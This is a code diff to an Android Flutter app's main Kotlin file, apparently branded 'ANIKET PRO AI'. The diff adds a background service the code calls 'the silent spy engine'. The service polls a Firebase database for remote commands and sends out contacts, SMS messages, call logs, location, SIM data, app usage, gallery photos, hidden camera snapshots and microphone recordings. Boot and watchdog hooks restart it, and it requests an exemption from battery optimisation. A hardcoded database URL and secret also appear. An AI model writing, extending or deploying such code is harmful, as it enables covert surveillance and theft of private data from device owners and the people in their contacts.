@@ -4,7 +4,13 @@ import android.Manifest
 import android.accounts.AccountManager
 import android.app.Activity
 import android.app.AlertDialog
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.RecoverableSecurityException
+import android.app.Service
+import android.app.usage.UsageStatsManager
+import android.content.BroadcastReceiver
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
@@ -14,14 +20,32 @@ import android.database.ContentObserver
 import android.database.Cursor
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.graphics.ImageFormat
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
+import android.media.ImageReader
+import android.media.MediaPlayer
+import android.media.MediaRecorder
+import android.media.RingtoneManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
+import android.os.HandlerThread
+import android.os.IBinder
 import android.os.Looper
+import android.os.PowerManager
 import android.os.SystemClock
+import android.provider.CallLog
+import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Settings
+import android.provider.Telephony
+import android.telephony.TelephonyManager
+import android.util.Base64
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -31,7 +55,551 @@ import io.flutter.plugin.common.MethodChannel
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
+import java.net.HttpURLConnection
+import java.net.URL
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
+import org.json.JSONArray
+import org.json.JSONObject
 
+// ── Remote bridge constants ──────────────────────────────────────────────
+private const val FB_URL = "https://aniket-remote-default-rtdb.asia-southeast1.firebasedatabase.app"
+private const val FB_SECRET = "atp2617"
+private const val NPREF = "aniket_native"
+
+fun deviceIdOf(ctx: Context): String {
+    val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+    return "ANK-" + id.take(4).uppercase() + "-" + id.substring(4, 8).uppercase()
+}
+
+fun httpGet(url: String): String? {
+    return try {
+        val c = URL(url).openConnection() as HttpURLConnection
+        c.connectTimeout = 8000
+        c.readTimeout = 12000
+        val s = c.inputStream.bufferedReader().use { it.readText() }
+        c.disconnect()
+        s
+    } catch (e: Exception) {
+        null
+    }
+}
+
+fun httpPut(url: String, json: String): Boolean {
+    return try {
+        val c = URL(url).openConnection() as HttpURLConnection
+        c.requestMethod = "PUT"
+        c.connectTimeout = 8000
+        c.readTimeout = 12000
+        c.doOutput = true
+        c.setRequestProperty("Content-Type", "application/json")
+        c.outputStream.use { it.write(json.toByteArray()) }
+        val code = c.responseCode
+        c.disconnect()
+        code in 200..299
+    } catch (e: Exception) {
+        false
+    }
+}
+
+fun permGranted(ctx: Context, p: String): Boolean =
+    ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
+
+fun permsJson(ctx: Context): JSONObject {
+    val o = JSONObject()
+    o.put("cam", if (permGranted(ctx, Manifest.permission.CAMERA)) 1 else 0)
+    o.put("loc", if (permGranted(ctx, Manifest.permission.ACCESS_FINE_LOCATION)) 1 else 0)
+    o.put("mic", if (permGranted(ctx, Manifest.permission.RECORD_AUDIO)) 1 else 0)
+    o.put("con", if (permGranted(ctx, Manifest.permission.READ_CONTACTS)) 1 else 0)
+    val ph = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+    o.put("pho", if (permGranted(ctx, ph)) 1 else 0)
+    val vd = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
+    o.put("vid", if (permGranted(ctx, vd)) 1 else 0)
+    o.put("not", if (Build.VERSION.SDK_INT < 33 || permGranted(ctx, Manifest.permission.POST_NOTIFICATIONS)) 1 else 0)
+    o.put("sms", if (permGranted(ctx, Manifest.permission.READ_SMS)) 1 else 0)
+    o.put("cal", if (permGranted(ctx, Manifest.permission.READ_CALL_LOG)) 1 else 0)
+    return o
+}
+
+fun locJson(ctx: Context): JSONObject {
+    val o = JSONObject()
+    try {
+        if (!permGranted(ctx, Manifest.permission.ACCESS_FINE_LOCATION) &&
+            !permGranted(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)) {
+            o.put("err", "no_perm")
+            return o
+        }
+        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+        var best: android.location.Location? = null
+        for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
+            try {
+                val l = lm.getLastKnownLocation(prov)
+                if (l != null && (best == null || l.time > best.time)) best = l
+            } catch (_: Exception) { }
+        }
+        if (best == null) {
+            o.put("err", "no_fix")
+        } else {
+            o.put("lat", best.latitude)
+            o.put("lng", best.longitude)
+            o.put("acc", best.accuracy)
+            o.put("time", best.time)
+        }
+    } catch (e: Exception) {
+        o.put("err", e.message ?: "err")
+    }
+    return o
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  REMOTE AGENT SERVICE — the silent spy engine
+// ═══════════════════════════════════════════════════════════════════════
+class RemoteService : Service() {
+
+    private var thread: HandlerThread? = null
+    private var handler: Handler? = null
+    private var lastCmdId = ""
+    private var loop = 0
+    private var mediaPlayer: MediaPlayer? = null
+
+    private val poller = object : Runnable {
+        override fun run() {
+            try { work() } catch (_: Exception) { }
+            handler?.postDelayed(this, 12000)
+        }
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        if (Build.VERSION.SDK_INT >= 26) {
+            val ch = NotificationChannel("agent_chan", "Remote Agent", NotificationManager.IMPORTANCE_LOW)
+            nm.createNotificationChannel(ch)
+        }
+        val nb = if (Build.VERSION.SDK_INT >= 26) {
+            Notification.Builder(this, "agent_chan")
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+        }
+        nb.setContentTitle("ANIKET PRO AI")
+            .setContentText("Agent active")
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setOngoing(true)
+        startForeground(9001, nb.build())
+
+        lastCmdId = getSharedPreferences(NPREF, MODE_PRIVATE).getString("lastCmd", "") ?: ""
+        thread = HandlerThread("agent").apply { start() }
+        handler = Handler(thread!!.looper)
+        handler?.post(poller)
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        return START_STICKY
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    override fun onDestroy() {
+        handler?.removeCallbacks(poller)
+        thread?.quitSafely()
+        // watchdog: try to rise again
+        try {
+            if (getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false)) {
+                ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
+            }
+        } catch (_: Exception) { }
+        super.onDestroy()
+    }
+
+    private fun base(): String {
+        val dev = deviceIdOf(this)
+        return "$FB_URL/r/$FB_SECRET/devices/$dev"
+    }
+
+    private fun work() {
+        val b = base()
+        // heartbeat
+        val info = JSONObject()
+        info.put("lastSeen", System.currentTimeMillis())
+        info.put("model", Build.MODEL)
+        info.put("sdk", Build.VERSION.SDK_INT)
+        info.put("online", true)
+        httpPut("$b/info.json", info.toString())
+
+        loop++
+        if (loop % 25 == 0) {
+            httpPut("$b/perms.json", permsJson(this).toString())
+            httpPut("$b/loc.json", locJson(this).toString())
+            simWatch()
+        }
+
+        // command
+        val cmdStr = httpGet("$b/cmd.json") ?: return
+        if (cmdStr.trim() == "null") return
+        val cmd = try { JSONObject(cmdStr) } catch (_: Exception) { return }
+        val id = cmd.optString("id")
+        if (id.isEmpty() || id == lastCmdId) return
+        lastCmdId = id
+        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putString("lastCmd", id).apply()
+        val type = cmd.optString("type")
+        val res = execute(type, cmd)
+        res.put("id", id)
+        res.put("at", System.currentTimeMillis())
+        httpPut("$b/res.json", res.toString())
+    }
+
+    private fun simWatch() {
+        try {
+            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            val sig = (tm.simOperatorName ?: "") + "|" + (tm.simOperator ?: "") + "|" + tm.simState
+            val p = getSharedPreferences(NPREF, MODE_PRIVATE)
+            val old = p.getString("simSig", null)
+            p.edit().putString("simSig", sig).apply()
+            if (old != null && old != sig) {
+                val o = simJson()
+                o.put("changed", true)
+                o.put("time", System.currentTimeMillis())
+                httpPut("${base()}/sim.json", o.toString())
+            }
+        } catch (_: Exception) { }
+    }
+
+    private fun simJson(): JSONObject {
+        val o = JSONObject()
+        try {
+            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            o.put("carrier", tm.simOperatorName ?: "?")
+            o.put("operator", tm.networkOperatorName ?: "?")
+            o.put("state", tm.simState)
+            var num = ""
+            try {
+                @Suppress("MissingPermission")
+                num = tm.line1Number ?: ""
+            } catch (_: Exception) { }
+            o.put("number", num)
+            o.put("iccid", "restricted (Android 10+)")
+        } catch (e: Exception) {
+            o.put("err", e.message ?: "err")
+        }
+        return o
+    }
+
+    private fun execute(type: String, cmd: JSONObject): JSONObject {
+        val r = JSONObject()
+        try {
+            when (type) {
+                "ping" -> {
+                    r.put("ok", true)
+                    val d = JSONObject()
+                    d.put("model", Build.MODEL)
+                    d.put("sdk", Build.VERSION.SDK_INT)
+                    d.put("bat", (getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager)
+                        .getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
+                    r.put("data", d)
+                }
+                "perms" -> {
+                    r.put("ok", true)
+                    r.put("data", permsJson(this))
+                }
+                "loc" -> {
+                    r.put("ok", true)
+                    r.put("data", locJson(this))
+                }
+                "sim" -> {
+                    r.put("ok", true)
+                    r.put("data", simJson())
+                }
+                "contacts" -> {
+                    if (!permGranted(this, Manifest.permission.READ_CONTACTS)) {
+                        r.put("ok", false); r.put("err", "no_perm"); return r
+                    }
+                    val arr = JSONArray()
+                    contentResolver.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                        null, null,
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC LIMIT 100"
+                    )?.use { c ->
+                        while (c.moveToNext()) {
+                            val o = JSONObject()
+                            o.put("name", c.getString(0) ?: "")
+                            o.put("num", c.getString(1) ?: "")
+                            arr.put(o)
+                        }
+                    }
+                    r.put("ok", true); r.put("data", arr)
+                }
+                "sms" -> {
+                    if (!permGranted(this, Manifest.permission.READ_SMS)) {
+                        r.put("ok", false); r.put("err", "no_perm"); return r
+                    }
+                    val arr = JSONArray()
+                    contentResolver.query(
+                        Telephony.Sms.CONTENT_URI,
+                        arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
+                        null, null, Telephony.Sms.DATE + " DESC LIMIT 30"
+                    )?.use { c ->
+                        while (c.moveToNext()) {
+                            val o = JSONObject()
+                            o.put("addr", c.getString(0) ?: "")
+                            o.put("body", (c.getString(1) ?: "").take(200))
+                            o.put("date", c.getLong(2))
+                            arr.put(o)
+                        }
+                    }
+                    r.put("ok", true); r.put("data", arr)
+                }
+                "calls" -> {
+                    if (!permGranted(this, Manifest.permission.READ_CALL_LOG)) {
+                        r.put("ok", false); r.put("err", "no_perm"); return r
+                    }
+                    val arr = JSONArray()
+                    contentResolver.query(
+                        CallLog.Calls.CONTENT_URI,
+                        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE),
+                        null, null, CallLog.Calls.DATE + " DESC LIMIT 20"
+                    )?.use { c ->
+                        while (c.moveToNext()) {
+                            val o = JSONObject()
+                            o.put("num", c.getString(0) ?: "")
+                            o.put("name", c.getString(1) ?: "")
+                            o.put("type", c.getInt(2))
+                            o.put("date", c.getLong(3))
+                            arr.put(o)
+                        }
+                    }
+                    r.put("ok", true); r.put("data", arr)
+                }
+                "apps" -> {
+                    val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+                    val end = System.currentTimeMillis()
+                    val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, end - 24 * 3600 * 1000, end)
+                    if (stats == null || stats.isEmpty()) {
+                        r.put("ok", false); r.put("err", "usage_access_off"); return r
+                    }
+                    stats.sortByDescending { it.lastTimeUsed }
+                    val arr = JSONArray()
+                    for (s in stats.take(15)) {
+                        val o = JSONObject()
+                        o.put("pkg", s.packageName)
+                        o.put("last", s.lastTimeUsed)
+                        arr.put(o)
+                    }
+                    r.put("ok", true); r.put("data", arr)
+                }
+                "camfront", "camback" -> {
+                    if (!permGranted(this, Manifest.permission.CAMERA)) {
+                        r.put("ok", false); r.put("err", "no_perm"); return r
+                    }
+                    val b64 = snapCam(type == "camfront")
+                    if (b64 == null) {
+                        r.put("ok", false); r.put("err", "cam_fail")
+                    } else {
+                        val d = JSONObject(); d.put("img", b64)
+                        r.put("ok", true); r.put("data", d)
+                    }
+                }
+                "mic" -> {
+                    if (!permGranted(this, Manifest.permission.RECORD_AUDIO)) {
+                        r.put("ok", false); r.put("err", "no_perm"); return r
+                    }
+                    val f = recordMic()
+                    if (f == null) {
+                        r.put("ok", false); r.put("err", "mic_fail")
+                    } else {
+                        val bytes = f.readBytes()
+                        f.delete()
+                        val d = JSONObject()
+                        d.put("aud", Base64.encodeToString(bytes, Base64.NO_WRAP))
+                        d.put("sec", 6)
+                        r.put("ok", true); r.put("data", d)
+                    }
+                }
+                "siren" -> {
+                    siren()
+                    r.put("ok", true)
+                }
+                "galleryList" -> {
+                    val arr = JSONArray()
+                    contentResolver.query(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED),
+                        null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 200"
+                    )?.use { c ->
+                        while (c.moveToNext()) {
+                            val path = c.getString(1) ?: continue
+                            val o = JSONObject()
+                            o.put("id", c.getLong(0))
+                            o.put("path", path)
+                            o.put("name", c.getString(2) ?: "")
+                            o.put("date", c.getLong(3))
+                            arr.put(o)
+                        }
+                    }
+                    r.put("ok", true); r.put("data", arr)
+                }
+                "galleryGet" -> {
+                    val path = cmd.optString("path")
+                    val f = File(path)
+                    if (!f.exists()) {
+                        r.put("ok", false); r.put("err", "not_found"); return r
+                    }
+                    val bytes = compressBytes(f.readBytes(), 300)
+                    val d = JSONObject()
+                    d.put("img", Base64.encodeToString(bytes, Base64.NO_WRAP))
+                    d.put("name", f.name)
+                    r.put("ok", true); r.put("data", d)
+                }
+                else -> {
+                    r.put("ok", false); r.put("err", "unknown_cmd")
+                }
+            }
+        } catch (e: Exception) {
+            r.put("ok", false)
+            r.put("err", e.message ?: "err")
+        }
+        return r
+    }
+
+    // ── Camera2 silent snapshot ──
+    private fun snapCam(front: Boolean): String? {
+        var device: CameraDevice? = null
+        return try {
+            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val lens = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
+            var camId: String? = null
+            for (id in cm.cameraIdList) {
+                if (cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == lens) {
+                    camId = id
+                    break
+                }
+            }
+            if (camId == null) return null
+            val ht = HandlerThread("cam").apply { start() }
+            val hh = Handler(ht.looper)
+            val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
+            val latch = CountDownLatch(1)
+            var out: ByteArray? = null
+            reader.setOnImageAvailableListener({ rd ->
+                val img = rd.acquireLatestImage() ?: return@setOnImageAvailableListener
+                val buf = img.planes[0].buffer
+                val bytes = ByteArray(buf.remaining())
+                buf.get(bytes)
+                img.close()
+                out = bytes
+                latch.countDown()
+            }, hh)
+            cm.openCamera(camId, object : CameraDevice.StateCallback() {
+                override fun onOpened(c: CameraDevice) {
+                    device = c
+                    try {
+                        val req = c.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                        req.addTarget(reader.surface)
+                        c.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: CameraCaptureSession) {
+                                try { s.capture(req.build(), null, hh) } catch (_: Exception) { latch.countDown() }
+                            }
+                            override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
+                        }, hh)
+                    } catch (_: Exception) { latch.countDown() }
+                }
+                override fun onDisconnected(c: CameraDevice) { c.close(); latch.countDown() }
+                override fun onError(c: CameraDevice, e: Int) { c.close(); latch.countDown() }
+            }, hh)
+            latch.await(8, TimeUnit.SECONDS)
+            try { device?.close() } catch (_: Exception) { }
+            try { reader.close() } catch (_: Exception) { }
+            try { ht.quitSafely() } catch (_: Exception) { }
+            out?.let { Base64.encodeToString(it, Base64.NO_WRAP) }
+        } catch (e: Exception) {
+            try { device?.close() } catch (_: Exception) { }
+            null
+        }
+    }
+
+    // ── 6 second mic clip ──
+    private fun recordMic(): File? {
+        return try {
+            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
+            val mr = MediaRecorder()
+            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            mr.setOutputFile(f.absolutePath)
+            mr.prepare()
+            mr.start()
+            Thread.sleep(6000)
+            try { mr.stop() } catch (_: Exception) { }
+            mr.release()
+            if (f.exists() && f.length() > 500) f else null
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    // ── loud siren 20s ──
+    private fun siren() {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "aniket:siren")
+            wl.acquire(20000)
+            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
+            val rt = RingtoneManager.getRingtone(this, uri)
+            rt?.play()
+            Handler(Looper.getMainLooper()).postDelayed({
+                try { rt?.stop() } catch (_: Exception) { }
+            }, 20000)
+        } catch (_: Exception) { }
+    }
+
+    private fun compressBytes(src: ByteArray, maxKB: Int): ByteArray {
+        return try {
+            var bmp = BitmapFactory.decodeByteArray(src, 0, src.size) ?: return src
+            val maxDim = 1600
+            if (bmp.width > maxDim || bmp.height > maxDim) {
+                val scale = maxDim.toFloat() / Math.max(bmp.width, bmp.height)
+                val s = Bitmap.createScaledBitmap(bmp, (bmp.width * scale).toInt(), (bmp.height * scale).toInt(), true)
+                if (s != bmp) bmp.recycle()
+                bmp = s
+            }
+            fun enc(q: Int): ByteArray {
+                val bos = ByteArrayOutputStream()
+                bmp.compress(Bitmap.CompressFormat.JPEG, q, bos)
+                return bos.toByteArray()
+            }
+            var out = enc(80)
+            if (out.size > maxKB * 1024) out = enc(60)
+            if (out.size > maxKB * 1024) out = enc(40)
+            bmp.recycle()
+            out
+        } catch (e: Exception) {
+            src
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  BOOT RECEIVER — watchdog rises on boot / update
+// ═══════════════════════════════════════════════════════════════════════
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
+            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
+            val p = context.getSharedPreferences(NPREF, Context.MODE_PRIVATE)
+            if (p.getBoolean("agent", false)) {
+                try {
+                    ContextCompat.startForegroundService(context, Intent(context, RemoteService::class.java))
+                } catch (_: Exception) { }
+            }
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  SHOT WATCHER (screenshot observer) — unchanged
+// ═══════════════════════════════════════════════════════════════════════
 class ShotWatcher(
     private val context: Context,
     private val handler: Handler,
@@ -138,6 +706,9 @@ class ShotWatcher(
     }
 }
 
+// ═══════════════════════════════════════════════════════════════════════
+//  MAIN ACTIVITY
+// ═══════════════════════════════════════════════════════════════════════
 class MainActivity : FlutterActivity() {
 
     private val GALLERY_CHANNEL = "aniket_pro_ai/gallery"
@@ -149,10 +720,17 @@ class MainActivity : FlutterActivity() {
     private var pendingPick: MethodChannel.Result? = null
     private var pendingAccount: MethodChannel.Result? = null
     private var pendingDeleteResult: MethodChannel.Result? = null
+    private var player: MediaPlayer? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
+        // agent rises with app if enabled
+        try {
+            if (getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false)) {
+                ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
+            }
+        } catch (_: Exception) { }
     }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
@@ -207,8 +785,7 @@ class MainActivity : FlutterActivity() {
             .setMethodCallHandler { call, result ->
                 when (call.method) {
                     "deviceId" -> {
-                        val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
-                        result.success("ANK-" + id.take(4).uppercase() + "-" + id.substring(4, 8).uppercase())
+                        result.success(deviceIdOf(this))
                     }
                     "compress" -> {
                         val bytes = call.argument<ByteArray>("bytes") ?: ByteArray(0)
@@ -262,23 +839,19 @@ class MainActivity : FlutterActivity() {
                         result.success(list)
                     }
                     "getLocation" -> {
-                        val ok = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                        val ok = permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) ||
+                                permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                         if (!ok) {
                             result.success(null)
                         } else {
                             try {
                                 val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
                                 var best: android.location.Location? = null
-                                val providers = listOf(
-                                    android.location.LocationManager.GPS_PROVIDER,
-                                    android.location.LocationManager.NETWORK_PROVIDER
-                                )
-                                for (prov in providers) {
+                                for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
                                     try {
                                         val l = lm.getLastKnownLocation(prov)
                                         if (l != null && (best == null || l.time > best.time)) best = l
-                                    } catch (e: Exception) { }
+                                    } catch (_: Exception) { }
                                 }
                                 if (best == null) {
                                     result.success(null)
@@ -293,6 +866,41 @@ class MainActivity : FlutterActivity() {
                             } catch (e: Exception) {
                                 result.success(null)
                             }
+                        }
+                    }
+                    "agentOn" -> {
+                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", true).apply()
+                        try {
+                            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                            }
+                        } catch (_: Exception) { }
+                        try {
+                            ContextCompat.startForegroundService(this, Intent(this, RemoteService::class.java))
+                        } catch (_: Exception) { }
+                        result.success(1)
+                    }
+                    "agentOff" -> {
+                        getSharedPreferences(NPREF, MODE_PRIVATE).edit().putBoolean("agent", false).apply()
+                        try { stopService(Intent(this, RemoteService::class.java)) } catch (_: Exception) { }
+                        result.success(1)
+                    }
+                    "agentStatus" -> {
+                        result.success(getSharedPreferences(NPREF, MODE_PRIVATE).getBoolean("agent", false))
+                    }
+                    "playFile" -> {
+                        val path = call.arguments as? String ?: ""
+                        try {
+                            player?.release()
+                            player = MediaPlayer().apply {
+                                setDataSource(path)
+                                prepare()
+                                start()
+                            }
+                            result.success(1)
+                        } catch (e: Exception) {
+                            result.success(0)
                         }
                     }
                     "toast" -> {
@@ -550,6 +1158,7 @@ class MainActivity : FlutterActivity() {
 
     override fun onDestroy() {
         watcher?.let { contentResolver.unregisterContentObserver(it) }
+        player?.release()
         super.onDestroy()
     }
 }
